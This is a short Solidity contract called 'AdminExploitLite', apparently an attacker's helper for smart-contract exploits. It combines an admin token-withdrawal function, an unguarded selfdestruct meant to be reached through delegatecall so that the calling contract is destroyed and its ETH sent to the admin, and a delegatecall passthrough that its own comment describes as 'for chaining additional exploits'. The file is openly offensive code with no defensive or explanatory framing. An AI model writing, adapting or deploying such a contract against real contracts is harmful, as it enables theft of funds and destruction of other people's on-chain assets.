// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract AdminExploitLite {
    address public admin;

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not the admin");
        _;
    }

    constructor() {
        admin = msg.sender;
    }

    // Withdraw ERC-20 tokens from this contract
    function withdrawTokens(address token, uint256 amount) external onlyAdmin {
        IERC20(token).transfer(admin, amount);
    }

    // Self-destruct and send ETH to admin (for delegatecall)
    function destroy() external {
        selfdestruct(payable(admin));
    }

    // Delegatecall passthrough for chaining additional exploits
    function delegateExploit(address target, bytes calldata data) external onlyAdmin {
        (bool success, ) = target.delegatecall(data);
        require(success, "Delegate call failed");
    }
}